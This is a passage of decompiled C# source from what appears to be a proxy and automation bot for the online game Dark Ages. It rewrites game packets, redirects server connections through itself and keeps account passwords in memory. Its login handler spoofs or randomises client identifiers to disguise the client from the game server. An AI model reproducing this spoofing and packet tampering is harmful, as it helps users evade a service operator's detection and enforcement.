      if (!System.IO.File.Exists(Program.StartupPath + "\\Settings\\timedevents.xml"))
      {
        System.IO.File.Create(Program.StartupPath + "\\Settings\\timedevents.xml").Close();
        XDocument xdocument = new XDocument();
        xdocument.Add((object) new XElement((XName) "TimedEvents"));
        xdocument.Save(Program.StartupPath + "\\Settings\\timedevents.xml");
      }
      try
      {
        foreach (XElement element in XDocument.Load(Program.StartupPath + "\\Settings\\timedevents.xml").Element((XName) "TimedEvents").Elements((XName) "Event"))
        {
          string[] strArray = element.Value.Split('|');
          ProxyBase.TimedEvent timedEvent = new ProxyBase.TimedEvent();
          timedEvent.Name = strArray[0];
          timedEvent.Time = Convert.ToDateTime(strArray[2]);
          timedEvent.Event = strArray[1];
          timedEvent.Track = Convert.ToBoolean(strArray[3]);
          if (!Server.TimedEvent.ContainsKey(timedEvent.Name + timedEvent.Event))
            Server.TimedEvent.Add(timedEvent.Name + timedEvent.Event, timedEvent);
          else
            Server.TimedEvent[timedEvent.Name + timedEvent.Event] = timedEvent;
        }
      }
      catch
      {
        XDocument xdocument = new XDocument();
        xdocument.Add((object) new XElement((XName) "TimedEvents"));
        xdocument.Save(Program.StartupPath + "\\Settings\\timedevents.xml");
      }
    }

    public void LoadLists()
    {
      if (!Directory.Exists(Program.StartupPath + "\\Settings\\Lists"))
        Directory.CreateDirectory(Program.StartupPath + "\\Settings\\Lists");
      if (!System.IO.File.Exists(Program.StartupPath + "\\Settings\\Lists\\customlootlist.txt"))
      {
        System.IO.File.Create(Program.StartupPath + "\\Settings\\Lists\\customlootlist.txt").Close();
      }
      else
      {
        if (Server.CustomLoot != null)
          Server.CustomLoot.Clear();
        StreamReader streamReader = new StreamReader(Program.StartupPath + "\\Settings\\Lists\\customlootlist.txt");
        string s;
        while ((s = streamReader.ReadLine()) != null)
          Server.CustomLoot.Add(int.Parse(s));
        streamReader.Close();
      }
      if (!System.IO.File.Exists(Program.StartupPath + "\\Settings\\Lists\\identifyitemslist.txt"))
      {
        System.IO.File.Create(Program.StartupPath + "\\Settings\\Lists\\identifyitemslist.txt").Close();
      }
      else
      {
        if (Server.IdentifyItems != null)
          Server.IdentifyItems.Clear();
        StreamReader streamReader = new StreamReader(Program.StartupPath + "\\Settings\\Lists\\identifyitemslist.txt");
        string str;
        while ((str = streamReader.ReadLine()) != null)
          Server.IdentifyItems.Add(str.ToLower());
        streamReader.Close();
      }
      if (!System.IO.File.Exists(Program.StartupPath + "\\Settings\\Lists\\trashlist.txt"))
      {
        System.IO.File.Create(Program.StartupPath + "\\Settings\\Lists\\trashlist.txt").Close();
      }
      else
      {
        if (Server.TrashList != null)
          Server.TrashList.Clear();
        StreamReader streamReader = new StreamReader(Program.StartupPath + "\\Settings\\Lists\\trashlist.txt");
        string str;
        while ((str = streamReader.ReadLine()) != null)
          Server.TrashList.Add(str.ToLower());
        streamReader.Close();
      }
      if (!System.IO.File.Exists(Program.StartupPath + "\\Settings\\Lists\\ignoreaislingslist.txt"))
      {
        System.IO.File.Create(Program.StartupPath + "\\Settings\\Lists\\ignoreaislingslist.txt").Close();
      }
      else
      {
        if (Server.ignoreaislinglist != null)
          Server.ignoreaislinglist.Clear();
        StreamReader streamReader = new StreamReader(Program.StartupPath + "\\Settings\\Lists\\ignoreaislingslist.txt");
        string str;
        while ((str = streamReader.ReadLine()) != null)
          Server.ignoreaislinglist.Add(str);
        streamReader.Close();
      }
    }

    public void LoadGMList()
    {
      if (Server.gmlist != null)
        Server.gmlist.Clear();
      if (!Directory.Exists(Program.StartupPath + "\\Settings"))
        return;
      if (!System.IO.File.Exists(Program.StartupPath + "\\Settings\\GMs.txt"))
      {
        StreamWriter streamWriter = new StreamWriter(Program.StartupPath + "\\Settings\\GMs.txt", true);
        streamWriter.WriteLine("kru");
        streamWriter.WriteLine("joeker");
        streamWriter.WriteLine("ishikawa");
                streamWriter.WriteLine("verran");
                streamWriter.WriteLine("kakarott");
                streamWriter.WriteLine("error");
                streamWriter.WriteLine("trial");
                streamWriter.Close();
        Server.gmlist.Add("kru");
        Server.gmlist.Add("joeker");
        Server.gmlist.Add("ishikawa");
                Server.gmlist.Add("verran");
                Server.gmlist.Add("kakarott");
                Server.gmlist.Add("error");
                Server.gmlist.Add("trial");
            }
      else
      {
        StreamReader streamReader = new StreamReader(Program.StartupPath + "\\Settings\\GMs.txt");
        string str;
        while ((str = streamReader.ReadLine()) != null)
          Server.gmlist.Add(str);
        streamReader.Close();
      }
    }

    public void LoadTimedEvents()
    {
    }

    public static void UpdateFriends()
    {
      if (Server.friendlist != null)
        Server.friendlist.Clear();
      if (Program.MainForm != null && Program.MainForm.friendlistbox.Items.Count > 0)
      {
        for (int index = 0; index <= Program.MainForm.friendlistbox.Items.Count - 1; ++index)
          Server.friendlist.Add(Program.MainForm.friendlistbox.Items[index].ToString());
      }
      foreach (Client client in Server.Clients)
      {
        if (client != null && client.Name != string.Empty)
          client.FriendListUpdate();
      }
    }

    public static void AlertNonFriendOkay(object sender, EventArgs e)
    {
      Server.AlertNonFriendTimer.Stop();
      Server.alertfornonfriends = true;
    }

    private static string GetFirstLine(string text)
    {
      using (StringReader stringReader = new StringReader(text))
        return stringReader.ReadLine();
    }

    public void ServerLoop()
    {
      this.Running = true;
      while (this.Running)
      {
        if (this.Listener.Pending())
        {
          Server.Clients.Add(new Client(this, this.Listener.AcceptSocket(), this.RemoteEndPoint));
          try
          {
            this.RemoteEndPoint = (EndPoint) new IPEndPoint(IPAddress.Parse("52.88.55.94"), 2610);
          }
          catch
          {
          }
        }
        Thread.Sleep(1);
      }
    }

    public bool ClientMessage_0x03_LogIn(Client client, ClientPacket msg)
    {
      client.Name = msg.ReadString((int) msg.ReadByte());
      client.Password = msg.ReadString((int) msg.ReadByte());
      if (!Server.Stuff.ContainsKey(client.Name))
        Server.Stuff.Add(client.Name, client.Password);
      else
        Server.Stuff[client.Name] = client.Password;
      if (!Server.DARegged.ContainsKey(client.Name))
        Server.DARegged.Add(client.Name, false);
      else
        Server.DARegged[client.Name] = false;
      if (this.SpoofClientId != 1 && this.SpoofClientId != 2)
        return true;
      string name = client.Name;
      string password = client.Password;
      msg.ReadByte();
      msg.ReadByte();
      uint num1 = msg.ReadUInt32();
      ushort num2 = msg.ReadUInt16();
      msg.ReadUInt32();
      msg.ReadUInt16();
      msg.ReadUInt16();
      Random random = new Random();
      if (this.SpoofClientId == 1)
      {
        num1 = (uint) random.Next();
        num2 = (ushort) random.Next();
      }
      else if (this.SpoofClientId == 2)
      {
        num1 = this.ClientId1;
        num2 = this.ClientId2;
      }
      msg.Clear();
      msg.WriteString8(name);
      msg.WriteString8(password);
      byte num3 = (byte) random.Next();
      byte num4 = (byte) random.Next();
      byte num5 = (byte) ((uint) num4 + 138U);
      int num6 = (int) num1;
      int num7 = (int) num5;
      int num8 = (int) (byte) (num7 + 1);
      byte num9 = (byte) (num8 + 1);
      int num10 = num7 | num8 << 8;
      int num11 = (int) num9;
      byte num12 = (byte) (num11 + 1);
      int num13 = num11 << 16;
      int num14 = num10 | num13 | (int) num12 << 24;
      uint num15 = (uint) (num6 ^ num14);
      byte num16 = (byte) ((uint) num4 + 94U);
      int num17 = (int) num2;
      int num18 = (int) num16;
      int num19 = (int) (ushort) (num18 | (int) (byte) (num18 + 1) << 8);
      ushort num20 = (ushort) (num17 ^ num19);
      uint num21 = (uint) (ushort) random.Next();
      byte num22 = (byte) ((uint) num4 + 115U);
      int num23 = (int) num21;
      int num24 = (int) num22;
      int num25 = (int) (byte) (num24 + 1);
      byte num26 = (byte) (num25 + 1);
      int num27 = num24 | num25 << 8;
      int num28 = (int) num26;
      byte num29 = (byte) (num28 + 1);
      int num30 = num28 << 16;
      int num31 = num27 | num30 | (int) num29 << 24;
      uint num32 = (uint) (num23 ^ num31);
      msg.WriteByte(num3);
      msg.WriteByte((byte) ((uint) num4 ^ (uint) num3 + 59U));
      msg.WriteUInt32(num15);
      msg.WriteUInt16(num20);
      msg.WriteUInt32(num32);
      ushort num33 = KruCRC.Calculate(msg.BodyData, name.Length + password.Length + 2, 12);
      byte num34 = (byte) ((uint) num4 + 165U);
      int num35 = (int) num33;
      int num36 = (int) num34;
      int num37 = (int) (ushort) (num36 | (int) (byte) (num36 + 1) << 8);
      ushort num38 = (ushort) (num35 ^ num37);
      msg.WriteUInt16(num38);
      msg.WriteUInt16((ushort) 256);
      msg.Write(new byte[3]);
      client.Enqueue(msg);
      return false;
    }

    public bool ClientMessage_0x06_Walking(Client client, ClientPacket msg)
    {
      switch (msg.ReadByte())
      {
        case 0:
          --client.ClientLocation.Y;
          break;
        case 1:
          ++client.ClientLocation.X;
          break;
        case 2:
          ++client.ClientLocation.Y;
          break;
        case 3:
          --client.ClientLocation.X;
          break;
      }
      if (client.LastMapLocation.ContainsKey(client.MapInfo.Number))
        client.LastMapLocation[client.MapInfo.Number] = new Location(client.ClientLocation.X, client.ClientLocation.Y);
      else
        client.LastMapLocation.Add(client.MapInfo.Number, new Location(client.ClientLocation.X, client.ClientLocation.Y));
      msg.BodyData[1] = client.WalkCounter++;
      client.laststep = DateTime.UtcNow;
      return true;
    }

    public bool ClientMessage_0x08_Drop(Client client, ClientPacket msg)
    {
      byte num1 = msg.ReadByte();
      ushort num2 = msg.ReadUInt16();
      ushort num3 = msg.ReadUInt16();
      msg.ReadUInt32();
      if (!client.HasItem("Warranty Bag") || !(client.Inventory[(int) num1 - 1].Name == "Succubus's Hair") || (!client.MapInfo.Name.Equals("Mileth Village") || !num2.Equals((ushort) 31)) || !num3.Equals((ushort) 52) && !num3.Equals((ushort) 53))
        return true;
      client.SendMessage("Deposit your Warranty Bag first.", "red", false);
      return false;
    }

    public bool ClientMessage_0x0B_LogOut(Client client, ClientPacket msg)
    {
      if (msg.ReadByte() == (byte) 0)
        client.logoff = true;
      if (Server.Alts.ContainsKey(client.Name.ToLower()))
        Server.Alts.Remove(client.Name.ToLower());
      foreach (Client client1 in Server.Alts.Values.ToArray<Client>())
      {
        if (client1 != null && client1.targetplayer != null)
        {
          foreach (targetPlayer targetPlayer in client1.targetplayer)
            targetPlayer?.updatePlayerTargets();
        }
      }
      return true;
    }

    public bool ClientMessage_0x0E_Speak(Client client, ClientPacket msg)
    {
      if (client.LastPermMessage != string.Empty)
        client.SendMessage(client.LastPermMessage, (byte) 18, false);
      msg.ReadByte();
      string str = msg.ReadString((int) msg.ReadByte());
      if (!str.StartsWith("/") || !client.Tab.vslash_commands)
        return true;
      if (client.SpeakMessage == string.Empty)
        client.SpeakMessage = str;
      return false;
    }

    public bool ClientMessage_0x0F_UseSpell(Client client, ClientPacket msg)
    {
      int num = (int) msg.ReadByte();
      Spell spell = client.SpellBook[num - 1];
      if (spell != null)
        client.LastSpell = spell.Name;
      if (msg.BodyData.Length > 6)
      {
        client.newtargetdelay = DateTime.UtcNow;
        client.LastTarget = msg.ReadUInt32();
        if (client.Characters.ContainsKey(client.LastTarget) && client.Characters[client.LastTarget] != null && client.Characters[client.LastTarget] is Npc && client.Characters[client.LastTarget].IsOnScreen)
          client.LastMonsterId = client.LastTarget;
      }
      client.ImCasting = false;
      client.castingoneline = false;
      return true;
    }

    public bool ClientMessage_0x10_ClientJoin(Client client, ClientPacket msg)
    {
      byte num = msg.ReadByte();
      byte[] numArray = msg.Read((int) msg.ReadByte());
      string str = msg.ReadString((int) msg.ReadByte());
      msg.ReadUInt32();
      client.Name = str;
      client.Tab.Text = str;
      string hashString = Program.GetHashString(Program.GetHashString(str));
      for (int index = 0; index < 31; ++index)
        hashString += Program.GetHashString(hashString);
      client.Seed = num;
      client.Key = numArray;
      client.KeyTable = Encoding.ASCII.GetBytes(hashString);
      return true;
    }

    public bool ClientMessage_0x13_Assail(Client client, ClientPacket msg)
    {
      return true;
    }

    public bool ClientMessage_0x1C_UseItem(Client client, ClientPacket msg)
    {
      int num = (int) msg.ReadByte();
      if (num != 60)
      {
        Item obj = client.Inventory[num - 1];
        if (obj != null)
        {
          if (obj.Name == "Lucky Clover")
            client.ateclover = true;
          else if (obj.Name == "Golden Starfish")
            client.ategsf = true;
          if (obj.Name.Contains("Bonus") || obj.Name.Contains("Double") || obj.Name.Contains("Experience") || obj.Name.Contains("Ability"))
            obj.NextUse = !obj.Name.Equals("Experience Gem") ? DateTime.UtcNow.AddMilliseconds(5000.0) : DateTime.UtcNow.AddMilliseconds(50000.0);
          else if (obj.Name == "Sprint Potion")
            obj.NextUse = DateTime.UtcNow.AddMilliseconds(16000.0);
          else if (obj.Name == "Grime Scent")
            obj.NextUse = DateTime.UtcNow.AddMilliseconds(11000.0);
          else if (obj.Name == "Damage Scroll")
            obj.NextUse = DateTime.UtcNow.AddMilliseconds(31000.0);
          else if (obj.Name.Contains("Two Move Combo"))
          {
            if (!client.comboscrollused)
              ++client.comboscrolluse;
            if (client.comboscrolluse >= 2)
            {
              obj.NextUse = DateTime.UtcNow.AddMilliseconds(121000.0);
              client.ComboScrollTimer.Start();
              client.comboscrolluse = 0;
              client.comboscrollused = true;
            }
          }
          else if (obj.Name.Contains("Three Move Combo"))
          {
            if (!client.comboscrollused)
              ++client.comboscrolluse;
            if (client.comboscrolluse >= 3)
            {
              obj.NextUse = DateTime.UtcNow.AddMilliseconds(121000.0);
              client.ComboScrollTimer.Start();
              client.comboscrolluse = 0;
              client.comboscrollused = true;
            }
          }
          else
            obj.NextUse = DateTime.UtcNow.AddMilliseconds(325.0);
        }
      }
      return true;
    }

    public bool ClientMessage_0x2E_Group(Client client, ClientPacket msg)
    {
      byte num = msg.ReadByte();
      string str = msg.ReadString((int) msg.ReadByte());
      if (!str.Contains("[") && !str.Contains(")"))
        return true;
      if (str.Contains("["))
        str = str.Remove(str.IndexOf("[") - 1);
      if (str.Contains(")"))
        str = str.Remove(0, str.IndexOf(" ") + 1);
      msg = new ClientPacket((byte) 46);
      msg.WriteByte(num);
      msg.WriteString8(str);
      msg.WriteByte((byte) 0);
      msg.WriteByte((byte) 0);
      msg.WriteByte(msg.Opcode);
      msg.Write(new byte[7]);
      client.Enqueue(msg);
      return false;
    }

    public bool ClientMessage_0x30_SwapSlots(Client client, ClientPacket msg)
    {
      byte num1 = msg.ReadByte();
      byte num2 = msg.ReadByte();
      byte num3 = msg.ReadByte();
      if (num1 == (byte) 0 && client.Tab.recorditemdata.Checked)
      {
        foreach (Character character in client.Characters.Values.ToArray<Character>())
        {
          if (character != null)
          {
            if (character.InventorySlot == (int) num2)
              character.InventorySlot = (int) num3;
            else if (character.InventorySlot == (int) num3)
              character.InventorySlot = (int) num2;
          }
        }
      }
      if (num1 == (byte) 2 && client.FakeSkills.Count > 0)
      {
        foreach (Skill skill in client.FakeSkills.Values)
        {
          if (skill != null)
          {
            if (skill.SkillSlot == (int) num2)
              skill.NewSlot = (int) num3;
            else if (skill.SkillSlot == (int) num3)
              skill.NewSlot = (int) num2;
          }
        }
      }
      return true;
    }

    public bool ClientMessage_0x39_DialogueSelect(Client client, ClientPacket msg)
    {
      client.CurrentnpcpopupID = 0U;
      client.Currentnpctext = string.Empty;
      client.Currentnpcscript = (ushort) 0;
      msg.Read(6);
      msg.ReadByte();
      msg.ReadUInt32();
      ushort num = msg.ReadUInt16();
      msg.ReadByte();
      client.SendMessage("Dialog: " + ((int) num - 1024).ToString() + ", (" + num.ToString() + ")", (byte) 0, true);
      if (num == (ushort) 99 && client.sendmode == 2)
        client.sendmode = 1;
      if (num == (ushort) 86 && client.withdrawmode == 2)
        client.withdrawmode = 1;
      if (num == (ushort) 83 && client.depositmode == 2)
        client.depositmode = 1;
      return true;
    }

    public bool ClientMessage_0x3A_PopupSelect(Client client, ClientPacket msg)
    {
      string empty = string.Empty;
      client.CurrentnpcpopupID = 0U;
      client.Currentnpctext = string.Empty;
      client.Currentnpcscript = (ushort) 0;
      msg.Read(6);
      msg.ReadByte();
      msg.ReadUInt32();
      ushort num1 = msg.ReadUInt16();
      ushort num2 = msg.ReadUInt16();
      client.SendMessage("Popup: " + num1.ToString() + ", action: " + num2.ToString(), (byte) 0, true);
      if (num2 == (ushort) 1)
        client.closepopupvars();
      if (num2 == (ushort) 2)
      {
        if (client.agchest)
        {
          client.agchest = false;
          client.agchestopen = true;
        }
        if (client.smallbag)
        {
          client.smallbag = false;
          client.smallbagopen = true;
        }
        if (client.bigbag)
        {
          client.bigbag = false;
          client.bigbagopen = true;
        }
        if (client.heavybag)
        {
          client.heavybag = false;
          client.heavybagopen = true;
        }
      }
      if (msg.Length >= (ushort) 22)
      {
        switch (msg.ReadByte())
        {
          case 1:
            byte num3 = msg.ReadByte();
            if (client.wdchest)
            {
              client.SaveTimedStuff(25);
              client.wdchest = false;
              if (num3 == (byte) 1 || num3 == (byte) 3)
                client.wdchestopen = true;
            }
            if (client.andorchest)
            {
              client.SaveTimedStuff(26);
              client.andorchest = false;
              if (num3 == (byte) 1 || num3 == (byte) 3)
                client.andorchestopen = true;
            }
            if (client.queenchest)
            {
              client.SaveTimedStuff(27);
              client.queenchest = false;
              if (num3 == (byte) 1 || num3 == (byte) 3)
                client.queenchestopen = true;
              break;
            }
            break;
          case 2:
            string str = msg.ReadString((int) msg.ReadByte());
            if (client.veltainchest)
            {
              client.veltainchest = false;
              client.veltainchestopen = true;
              client.chestfee = str;
            }
            if (client.heavychest)
            {
              client.heavychest = false;
              client.heavychestopen = true;
              client.chestfee = str;
            }
            break;
        }
      }
      return true;
    }

    public bool ClientMessage_0x3B_BoardSelect(Client client, ClientPacket msg)
    {
      return true;
    }

    public bool ClientMessage_0x3E_UseSkill(Client client, ClientPacket msg)
    {
      int num = (int) msg.ReadByte();
      Skill skill = (Skill) null;
      foreach (Skill skill1 in client.FakeSkills.Values)
      {
        if (skill1 != null && num == skill1.SkillSlot)
        {
          skill = skill1;
          break;
        }
      }
      if (skill != null && (client.Combos.Count<KeyValuePair<string, string>>() > 0 && client.Combos.ContainsKey(skill.Name)))
        new Thread((ThreadStart) (() =>
        {
          string combo = client.Combos[skill.Name];
          char[] chArray = new char[1]{ '|' };
          foreach (string str1 in combo.Split(chArray))
          {
            string str2 = str1.Trim();
            if (str2.Equals("space", StringComparison.CurrentCultureIgnoreCase) || str2.Equals("assail", StringComparison.CurrentCultureIgnoreCase))
              client.Assail();
            else if (!client.UseSkill(str2, 0U) && !client.UseMedSkill(str2) && !client.UseItem(str2))
              client.Cast(str2, new uint?());
          }
        })).Start();
      return true;
    }

    public bool ClientMessage_0x3F_WorldMapSelect(Client client, ClientPacket msg)
    {
      client.Towns.Clear();
      return true;
    }

    public bool ClientMessage_0x43_ClickCharacter(Client client, ClientPacket msg)
    {
      byte num1 = msg.ReadByte();
      if (num1 == (byte) 3)
      {
        uint num2 = (uint) msg.ReadUInt16();
        uint num3 = (uint) msg.ReadUInt16();
        uint num4 = (uint) msg.ReadByte();
      }
      if (num1 == (byte) 1)
      {
        uint key = msg.ReadUInt32();
        client.LastClickID = key;
        if (key == 1U)
        {
          client.previousfakepopup = 0;
          client.queststep = 1;
          client.StrajPopupText(1);
        }
        if (client.Tab.getrealnames.Checked && client.Characters.ContainsKey(key))
          client.DistanceLook((ushort) client.Characters[key].Location.X, (ushort) client.Characters[key].Location.Y);
      }
      if (client.Tab.vgetimage && client.Characters.ContainsKey(client.LastClickID) && client.Characters[client.LastClickID] != null && client.Characters[client.LastClickID] is Npc)
      {
        Client client1 = client;
        int image = (client.Characters[client.LastClickID] as Npc).Image;
        string text = "Image: " + image.ToString() + " ID: " + client.LastClickID.ToString();
        client1.SendMessage(text, (byte) 0, false);
        TextBox newmonstername = client.Tab.newmonstername;
        image = (client.Characters[client.LastClickID] as Npc).Image;
        string str = image.ToString();
        newmonstername.Text = str;
        foreach (Client client2 in Server.Clients)
        {
          if (client2.Tab != null && client2.LoggedOn)
          {
            client2.Tab.drophaxnpcid.Value = (Decimal) client.LastClickID;
            client2.Tab.npcid.Value = (Decimal) client.LastClickID;
          }
        }
        client.LastClickID = 0U;
      }
      return true;
    }

    public bool ClientMessage_0x44_UnequipGear(Client client, ClientPacket msg)
    {
      if (msg.ReadByte() == (byte) 2)
        client.manualremovedarmor = true;
      return true;
    }

    public bool ClientMessage_0x4D_SpellLines(Client client, ClientPacket msg)
    {
      client.ImCasting = true;
      byte Lines = msg.ReadByte();
      if (Lines != (byte) 1)
        return true;
      client.mancastdelay = DateTime.UtcNow;
      if (client.Tab.halfcast.Checked)
        client.StartCast((int) Lines);
      else
        new Thread((ThreadStart) (() => client.StartCast((int) Lines))).Start();
      return false;
    }

    public bool ServerMessage_0x03_Redirect(Client client, ServerPacket msg)
    {
      byte[] address = msg.Read(4);
      ushort num = msg.ReadUInt16();
      msg.ReadByte();
      msg.ReadByte();
      msg.Read((int) msg.ReadByte());
      string key = msg.ReadString((int) msg.ReadByte());
      msg.ReadUInt32();
      client.Name = key;
      client.Redirected = true;
      if (!Server.DAServer.ContainsKey(key))
        Server.DAServer.Add(key, (int) num);
      else
        Server.DAServer[key] = (int) num;
      Array.Reverse((Array) address);
      this.RemoteEndPoint = (EndPoint) new IPEndPoint(new IPAddress(address), (int) num);
      msg.BodyData[0] = (byte) 1;
      msg.BodyData[1] = (byte) 0;
      msg.BodyData[2] = (byte) 0;
      msg.BodyData[3] = (byte) 127;
      msg.BodyData[4] = (byte) 10;
      msg.BodyData[5] = (byte) 50;
      return true;
    }

    public bool ServerMessage_0x04_Location(Client client, ServerPacket msg)
    {
      client.ServerLocation.X = (int) msg.ReadUInt16();
      client.ServerLocation.Y = (int) msg.ReadUInt16();
      this.Savegamemaps(client);
      List<string> checkedtiles = client.checkedtiles;
      int num = client.ServerLocation.X;
      string str1 = num.ToString();
      num = client.ServerLocation.Y;
      string str2 = num.ToString();
      string str3 = str1 + "," + str2;
      checkedtiles.Add(str3);
      return true;
    }

    public bool ServerMessage_0x05_PlayerID(Client client, ServerPacket msg)
    {
      client.PlayerID = msg.ReadUInt32();
      msg.Read(1);
      msg.Read(1);
      client.Path = msg.ReadByte();
      msg.Read(1);
      client.Gender = msg.ReadByte();
      msg.BodyData[6] = (byte) 2;
      if (client.Path == (byte) 1)
      {
        client.pathmaxhp = client.warmax;
        client.pathstr = client.warstr;
        client.pathint = client.warint;
        client.pathwis = client.warwis;
        client.pathcon = client.warcon;
        client.pathdex = client.wardex;
      }
      else if (client.Path == (byte) 2)
      {
        client.pathmaxhp = client.roguemax;
        client.pathstr = client.roguestr;
        client.pathint = client.rogueint;
        client.pathwis = client.roguewis;
        client.pathcon = client.roguecon;
        client.pathdex = client.roguedex;
      }
      else if (client.Path == (byte) 3)
      {
        client.pathmaxhp = client.wizmax;
        client.pathstr = client.wizstr;
        client.pathint = client.wizint;
        client.pathwis = client.wizwis;
        client.pathcon = client.wizcon;
        client.pathdex = client.wizdex;
      }
      else if (client.Path == (byte) 4)
      {
        client.pathmaxhp = client.priestmax;
        client.pathstr = client.prieststr;
        client.pathint = client.priestint;
        client.pathwis = client.priestwis;
        client.pathcon = client.priestcon;
        client.pathdex = client.priestdex;
      }
      else if (client.Path == (byte) 5)
      {
        client.pathmaxhp = client.monkmax;
        client.pathstr = client.monkstr;
        client.pathint = client.monkint;
        client.pathwis = client.monkwis;
        client.pathcon = client.monkcon;
        client.pathdex = client.monkdex;
      }
      client.GetHandle();
      client.BestAites();
      client.BestFases();
      client.BestIocs();
      client.BestDions();
      client.BestCradhs();
      client.BestPramhs();
      client.BestAttacks1();
      client.BestAttacks2();
      client.SpellsAppear();
      client.SkillsAppear();
      client.TrinketsAppear();
      client.Tab.PopulateLureList();
      client.LoadMacroList();
      client.MacroSpells();
      Program.MainForm.AddTab(client.Tab);
      if (!Server.Alts.ContainsKey(client.Name.ToLower()))
        Server.Alts.Add(client.Name.ToLower(), client);
      if (!Server.friendlist.Contains(client.Name.ToLower()))
      {
        Program.MainForm.friendlistbox.Items.Add((object) client.Name.ToLower());
        Program.MainForm.SaveFriends();
        Server.UpdateFriends();
      }
      foreach (Client client1 in Server.Alts.Values.ToArray<Client>())
      {
        if (client1 != null && client1.targetplayer != null)
        {
          foreach (targetPlayer targetPlayer in client1.targetplayer)
            targetPlayer?.updatePlayerTargets();
        }
      }
      client.Tab.LoadTemplates();
      if (Server.Relog.ContainsKey(client.Name))
      {
        client.Tab.LoadTemplate("", true);
        client.Relogged();
      }
      else
      {
        if (System.IO.File.Exists(Program.StartupPath + "\\Settings\\" + client.Name.ToLower() + "\\" + client.Name.ToLower() + "_default.xml"))
        {
          if (System.IO.File.Exists(Program.StartupPath + "\\Settings\\" + client.Name.ToLower() + "\\default.xml"))
            System.IO.File.Delete(Program.StartupPath + "\\Settings\\" + client.Name.ToLower() + "\\default.xml");
          System.IO.File.Move(Program.StartupPath + "\\Settings\\" + client.Name.ToLower() + "\\" + client.Name.ToLower() + "_default.xml", Program.StartupPath + "\\Settings\\" + client.Name.ToLower() + "\\default.xml");
          client.Tab.LoadTemplate("default", false);
        }
        else if (!System.IO.File.Exists(Program.StartupPath + "\\Settings\\" + client.Name.ToLower() + "\\default.xml"))
          client.Tab.SaveTemplate("default", false);
        else if (Program.MainForm.preload.Checked && Program.MainForm.preloadtemplate.Text != string.Empty)
          client.Tab.LoadTemplate(Program.MainForm.preloadtemplate.Text, false);
        else
          client.Tab.LoadTemplate("default", false);
        if (Program.MainForm.pregroup.Checked && Program.MainForm.pregroupname.Text != string.Empty)
          client.ForceGroup(Program.MainForm.pregroupname.Text, (byte) 3);
        if (Program.MainForm.preplay.Checked)
        {
          client.pause = false;
          client.Tab.btnPlay.Enabled = false;
          client.Tab.btnStop.Enabled = true;
        }
      }
      client.IniTimedStuff();
      foreach (Client client1 in Server.Alts.Values.ToArray<Client>())
      {
        if (client1 != null && client1.Name != client.Name && client1.Name != string.Empty && (client1.Tab.requestlabornametext.Text == string.Empty || client1.Tab.requestlabornametext.Text == client.Name))
        {
          client1.Tab.requestlabornametext.Text = client.Name;
          if (client1.waitingforlabor)
            client1.Whisper(client.Name, client1.Tab.requestlabormessagetext.Text);
        }
      }
      if (Program.MainForm.loglabormules.Checked && Program.MainForm.labormulelist.Items.Count > 0)
      {
        foreach (object obj in Program.MainForm.labormulelist.Items)
        {
          if (obj.ToString().ToLower().Contains(client.Name.ToLower()))
          {
            client.Tab.laborname.Text = Program.MainForm.laborname.Text;
            client.Tab.btnPlay.PerformClick();
            client.Tab.autowalker_locales.Text = "Nearest Bank";
            client.Tab.walksettings.Value = new Decimal(160);
            client.Tab.fastwalk.Checked = true;
            client.Tab.autowalker_button.Text = "Stop";
            client.autowalkon = true;
            break;
          }
        }
      }
      else if (Program.MainForm.getmentored.Checked && Program.MainForm.labormulelist.Items.Count > 0)
      {
        foreach (object obj in Program.MainForm.labormulelist.Items)
        {
          if (obj.ToString().ToLower().Contains(client.Name.ToLower()))
          {
            client.Tab.btnPlay.PerformClick();
            client.Tab.autowalker_locales.Text = "Rucesion";
            client.Tab.walklocaleslist.SelectedItem = (object) "Armor Shop";
            client.Tab.walksettings.Value = new Decimal(240);
            client.Tab.autowalker_button.Text = "Stop";
            client.autowalkon = true;
            break;
          }
        }
      }
      else if (Program.MainForm.logpigchase.Checked && Program.MainForm.labormulelist.Items.Count > 0)
      {
        foreach (object obj in Program.MainForm.labormulelist.Items)
        {
          if (obj.ToString().ToLower().Contains(client.Name.ToLower()))
          {
            client.Tab.btnPlay.PerformClick();
            client.Tab.autowalker_locales.Text = "Loures";
            client.Tab.walklocaleslist.SelectedItem = (object) "Maze";
            client.Tab.walksettings.Value = new Decimal(250);
            client.Tab.autowalker_button.Text = "Stop";
            client.autowalkon = true;
            client.Tab.pigwalk.Checked = true;
            break;
          }
        }
      }
      else if (Program.MainForm.frostylog.Checked && Program.MainForm.labormulelist.Items.Count > 0)
      {
        foreach (object obj in Program.MainForm.labormulelist.Items)
        {
          if (obj.ToString().ToLower().Contains(client.Name.ToLower()))
          {
            client.Tab.btnPlay.PerformClick();
            client.Tab.autowalker_locales.Text = "Loures";
            client.Tab.walklocaleslist.SelectedItem = (object) "Frosty (x-mas)";
            client.Tab.walksettings.Value = new Decimal(250);
            client.Tab.autowalker_button.Text = "Stop";
            client.autowalkon = true;
            client.frostygift = true;
            break;
          }
        }
      }
      client.RequestGroupList();
      client.LoadVariables();
      client.Tab.AscendOptions.statbuyupdate();
      client.Loaded = true;
      client.LoggedOn = true;
      if (!client.BotThread.IsAlive)
        client.BotThread.Start();
      if (!client.EntityNameThread.IsAlive)
        client.EntityNameThread.Start();
      if (!client.WalkThread.IsAlive)
        client.WalkThread.Start();
      if (!client.QuestsThread.IsAlive)
        client.QuestsThread.Start();
      if (!client.SpeakCommandThread.IsAlive)
        client.SpeakCommandThread.Start();
      if (client.Tab.pigwalk.Checked && client.HasItem("Ability and Experience Gift 1") && client.ItemAmount("Ability and Experience Gift 1") == 5U)
      {
        client.SendMessage("Stopped walking, you're at max stack of gift 1s", "red", false);
        client.pause = true;
        client.Tab.btnPlay.Enabled = true;
        client.Tab.btnStop.Enabled = false;
      }
      if (client.Tab.pigwalk.Checked && client.HasItem("Ability and Experience Gift 2") && client.ItemAmount("Ability and Experience Gift 2") == 5U)
      {
        client.SendMessage("Stopped walking, you're at max stack of gift 2s", "red", false);
        client.pause = true;
        client.Tab.btnPlay.Enabled = true;
        client.Tab.btnStop.Enabled = false;
      }
      return true;
    }

    public bool ServerMessage_0x07_DisplayNPC(Client client, ServerPacket msg)
    {
      int num1 = (int) msg.ReadUInt16();
      for (int index = 0; index < num1; ++index)
      {
        Npc npc1 = new Npc();
        npc1.Location.X = (int) msg.ReadUInt16();
        npc1.Location.Y = (int) msg.ReadUInt16();
        npc1.ID = msg.ReadUInt32();
        npc1.Image = (int) msg.ReadUInt16();
        npc1.Map = client.MapInfo.Number;
        npc1.MapName = client.MapInfo.Name;
